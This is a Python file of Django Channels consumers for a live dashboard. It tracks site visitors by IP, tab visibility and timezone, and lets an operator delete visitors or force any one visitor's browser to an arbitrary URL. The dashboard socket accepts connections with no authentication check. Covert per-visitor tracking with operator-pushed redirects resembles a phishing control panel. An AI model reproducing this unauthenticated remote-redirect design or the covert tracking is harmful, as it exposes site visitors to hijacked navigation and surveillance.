# dashboard/consumers.py
import json
from channels.generic.websocket import AsyncWebsocketConsumer
from channels.db import database_sync_to_async # For database operations
from .models import ClientConnection # To fetch counts
from channels.layers import get_channel_layer

class DashboardConsumer(AsyncWebsocketConsumer):
    dashboard_group_name = 'dashboard_updates'

    async def connect(self):
        await self.channel_layer.group_add(
            self.dashboard_group_name,
            self.channel_name
        )
        await self.accept()
        print(f"WebSocket connected: {self.channel_name} to group {self.dashboard_group_name}")
        await self.send_initial_dashboard_data()

    async def disconnect(self, close_code):
        print(f"WebSocket disconnected: {self.channel_name}, code: {close_code}")
        await self.channel_layer.group_discard(
            self.dashboard_group_name,
            self.channel_name
        )

    async def send_dashboard_update(self, event):
        message_data = event['data']
        await self.send(text_data=json.dumps({
            'type': 'dashboard_update',
            'payload': message_data
        }))
        print(f"Sent dashboard_update to {self.channel_name}: {message_data}")

    
    async def send_client_row_update(self, event):
        # This handles updates for a specific client's row (e.g., page change, status change)
        client_data = event['data'] # This is the client_conn.to_dict() from middleware
        await self.send(text_data=json.dumps({
            'type': 'client_row_update', # JS will look for this type
            'payload': client_data
        }))
        print(f"Sent client_row_update to {self.channel_name} for client ID/IP {client_data.get('id')}")

    @database_sync_to_async
    def _get_initial_data(self):
        total_visits = ClientConnection.objects.count()
        total_connects = ClientConnection.objects.filter(is_connected=True).count()
        connected_clients_qs = ClientConnection.objects.filter(is_connected=True).order_by('-last_seen')
        initial_clients_data = [client.to_dict() for client in connected_clients_qs]
        return {
            'total_visits': total_visits,
            'total_connects': total_connects,
            'initial_clients': initial_clients_data
        }

    async def send_initial_dashboard_data(self):
        initial_payload = await self._get_initial_data()
        await self.send(text_data=json.dumps({
            'type': 'initial_data',
            'payload': initial_payload
        }))
        print(f"Sent initial_data to {self.channel_name}: {initial_payload}")

    async def receive(self, text_data):
        try:
            data = json.loads(text_data)
            message_type = data.get('type')
            payload = data.get('payload')
            print(f"[DashboardConsumer] Received message: Type: {message_type}, Payload: {payload}")

            if message_type == 'delete_client_request':
                ip_to_delete = payload.get('ip_address')
                if ip_to_delete:
                    await self.handle_delete_client(ip_to_delete)

            elif message_type == 'initiate_client_redirect':
                target_ip = payload.get('target_ip')
                redirect_url = payload.get('redirect_url')
                if target_ip and redirect_url:
                    await self.handle_initiate_client_redirect(target_ip, redirect_url)
            # else:
            #     print(f"[DashboardConsumer] Unknown message type received: {message_type}")
        except Exception as e: # Broader exception catch for receive
            print(f"[DashboardConsumer] Error processing received message: {e}")

    @database_sync_to_async
    def _get_client_activity_channel_name(self, ip_address):
        try:
            client_conn = ClientConnection.objects.get(ip_address=ip_address)
            return client_conn.activity_socket_channel_name
        except ClientConnection.DoesNotExist:
            return None

    async def handle_initiate_client_redirect(self, target_ip, redirect_url):
        target_channel_name = await self._get_client_activity_channel_name(target_ip)

        if target_channel_name:
            print(f"[DashboardConsumer] Initiating redirect for IP {target_ip} to {redirect_url} via channel {target_channel_name}")
            channel_layer = get_channel_layer()
            await channel_layer.send(
                target_channel_name, # Send to specific client's activity channel
                {
                    'type': 'force_redirect_command', # This will call the method in ClientActivityConsumer
                    'url': redirect_url
                }
            )
            # Notify the admin that the command was sent
            await self.send(text_data=json.dumps({
                'type': 'action_feedback',
                'payload': {'message': f"Redirect command sent to {target_ip} for URL: {redirect_url}", 'status': 'success'}
            }))
        else:
            print(f"[DashboardConsumer] Could not find active activity channel for IP {target_ip} to redirect.")
            await self.send(text_data=json.dumps({
                'type': 'action_feedback',
                'payload': {'message': f"Failed to send redirect: Client {target_ip} not actively connected or channel not found.", 'status': 'error'}
            }))


    @database_sync_to_async
    def _perform_delete_client(self, ip_address):
        try:
            count, _ = ClientConnection.objects.filter(ip_address=ip_address).delete()
            if count > 0:
                print(f"[DashboardConsumer] DB: Deleted ClientConnection records for IP {ip_address} (Count: {count})")
                return True
            else:
                print(f"[DashboardConsumer] DB: No ClientConnection found for IP {ip_address} to delete.")
                return False # No records were deleted
        except Exception as e:
            print(f"[DashboardConsumer] DB: Error deleting client {ip_address}: {e}")
            return False

    async def handle_delete_client(self, ip_address):
        deleted_from_db = await self._perform_delete_client(ip_address)
        channel_layer = get_channel_layer()

        if deleted_from_db:
            # 1. Tell all dashboards to remove this specific client's row
            await channel_layer.group_send(
                self.dashboard_group_name,
                {
                    # This type will be handled by a new method in this consumer
                    # which then sends the 'client_removed' message to the JS
                    'type': 'broadcast_client_removed',
                    'data': {'ip_address': ip_address}
                }
            )

            # 2. Send updated stats to all dashboards
            total_visits_now = await database_sync_to_async(ClientConnection.objects.count)()
            total_connects_now = await database_sync_to_async(ClientConnection.objects.filter(is_connected=True).count)()
            await channel_layer.group_send(
                self.dashboard_group_name,
                {
                    'type': 'send_dashboard_update', # Existing handler for stats
                    'data': {
                        'total_visits': total_visits_now,
                        'total_connects': total_connects_now
                        # No need to send new_connected_client here for a delete operation
                    }
                }
            )
            print(f"[DashboardConsumer] Broadcasted removal and stats update for IP {ip_address}")
        else:
            # Send failure message ONLY back to the client that made the request
            await self.send(text_data=json.dumps({
                'type': 'client_delete_failed',
                'payload': {'ip_address': ip_address, 'message': 'Client not found or failed to delete.'}
            }))

    # New handler method for the group message, to then send to individual WebSockets
    async def broadcast_client_removed(self, event):
        # This method is called for each consumer in the group
        # It then sends the actual 'client_removed' message to its specific WebSocket client
        ip_address_removed = event['data']['ip_address']
        await self.send(text_data=json.dumps({
            'type': 'client_removed', # This is what JS listens for to remove the row
            'payload': {'ip_address': ip_address_removed}
        }))
        print(f"Sent 'client_removed' to {self.channel_name} for IP {ip_address_removed}")



class ClientActivityConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        self.client_ip = self.scope['client'][0]
        print(f"[ClientActivityConsumer] WebSocket connected from IP: {self.client_ip} with channel_name: {self.channel_name}")
        await self.accept()
        # Store the channel name in the DB associated with this IP
        await self.store_channel_name(self.client_ip, self.channel_name)

    async def disconnect(self, close_code):
        print(f"[ClientActivityConsumer] WebSocket disconnected from IP: {self.client_ip}, code: {close_code}")
        # Clear the channel name from the DB
        await self.store_channel_name(self.client_ip, None) # Set to None or empty string

    @database_sync_to_async
    def store_channel_name(self, ip_address, channel_name_to_store):
        try:
            # Use update_or_create to handle cases where middleware might not have run yet for this IP,
            # though it's less likely for this specific socket.
            conn, created = ClientConnection.objects.update_or_create(
                ip_address=ip_address,
                defaults={'activity_socket_channel_name': channel_name_to_store}
            )
            if not created and conn.activity_socket_channel_name != channel_name_to_store: # Only save if changed
                conn.activity_socket_channel_name = channel_name_to_store
                conn.save(update_fields=['activity_socket_channel_name'])
            elif created:
                print(f"[ClientActivityConsumer] DB: Created ClientConnection for {ip_address} while storing channel name.")

            print(f"[ClientActivityConsumer] DB: Stored channel name '{channel_name_to_store}' for IP {ip_address}")
        except Exception as e:
            print(f"[ClientActivityConsumer] DB: Error storing channel name for {ip_address}: {e}")

    async def receive(self, text_data):
        try:
            data = json.loads(text_data)
            message_type = data.get('type')
            print(f"[ClientActivityConsumer] Received message from {self.client_ip}: {data}")

            if message_type == 'visibility_change':
                is_visible = data.get('visible', False)
                new_status = 'visible' if is_visible else 'hidden'
                await self.update_client_status(self.client_ip, new_status)
            
            # **** HANDLE TIMEZONE UPDATE ****
            elif message_type == 'client_timezone_update':
                client_tz = data.get('timezone')
                if client_tz:
                    await self.update_client_timezone(self.client_ip, client_tz)
            else:
                print(f"[ClientActivityConsumer] Unknown message type from client: {message_type}")
                
            # **** END HANDLE TIMEZONE UPDATE ****

        except json.JSONDecodeError:
            print(f"[ClientActivityConsumer] Invalid JSON received from {self.client_ip}: {text_data}")
        except Exception as e:
            print(f"[ClientActivityConsumer] Error processing message from {self.client_ip}: {e}")

    # **** NEW: Handler for direct messages from DashboardConsumer ****
    async def force_redirect_command(self, event):
        redirect_url = event.get('url')
        if redirect_url:
            print(f"[ClientActivityConsumer] Received force_redirect_command for IP {self.client_ip} to URL: {redirect_url}")
            await self.send(text_data=json.dumps({
                'type': 'force_redirect', # This is what visibility_tracker.js will listen for
                'url': redirect_url
            }))
        else:
            print(f"[ClientActivityConsumer] Received force_redirect_command without URL for IP {self.client_ip}")

    @database_sync_to_async
    def _update_db_status(self, ip_address, new_status):
        try:
            client_conn = ClientConnection.objects.get(ip_address=ip_address)
            if client_conn.status != new_status:
                client_conn.status = new_status
                client_conn.save(update_fields=['status']) # Only update status field
                print(f"[ClientActivityConsumer] DB: Updated status for {ip_address} to {new_status}")
                return client_conn.to_dict() # Return data for broadcasting
            return None # No change, no need to broadcast
        except ClientConnection.DoesNotExist:
            print(f"[ClientActivityConsumer] DB: ClientConnection not found for IP {ip_address} during status update.")
            return None
        except Exception as e:
            print(f"[ClientActivityConsumer] DB: Error updating status for {ip_address}: {e}")
            return None

    async def update_client_status(self, ip_address, new_status):
        updated_client_data = await self._update_db_status(ip_address, new_status)

        if updated_client_data:
            # Broadcast this update to the main dashboard group
            channel_layer = get_channel_layer()
            await channel_layer.group_send(
                DashboardConsumer.dashboard_group_name, # Target the dashboard's group
                {
                    'type': 'send_client_row_update', # This method exists in DashboardConsumer
                    'data': updated_client_data
                }
            )
            print(f"[ClientActivityConsumer] Broadcasted status update for {ip_address} to dashboard group.")

    @database_sync_to_async
    def _update_db_timezone(self, ip_address, new_timezone):
        try:
            client_conn = ClientConnection.objects.get(ip_address=ip_address)
            if client_conn.timezone != new_timezone:
                client_conn.timezone = new_timezone
                client_conn.save(update_fields=['timezone'])
                print(f"[ClientActivityConsumer] DB: Updated timezone for {ip_address} to {new_timezone}")
                return client_conn.to_dict()
            return None
        except ClientConnection.DoesNotExist:
            print(f"[ClientActivityConsumer] DB: ClientConnection not found for IP {ip_address} during timezone update.")
            return None
        except Exception as e:
            print(f"[ClientActivityConsumer] DB: Error updating timezone for {ip_address}: {e}")
            return None

    async def update_client_timezone(self, ip_address, new_timezone):
        updated_client_data = await self._update_db_timezone(ip_address, new_timezone)
        if updated_client_data:
            channel_layer = get_channel_layer()
            await channel_layer.group_send(
                DashboardConsumer.dashboard_group_name,
                {
                    'type': 'send_client_row_update', # Use the same update type
                    'data': updated_client_data
                }
            )
            print(f"[ClientActivityConsumer] Broadcasted timezone update for {ip_address} to dashboard group.")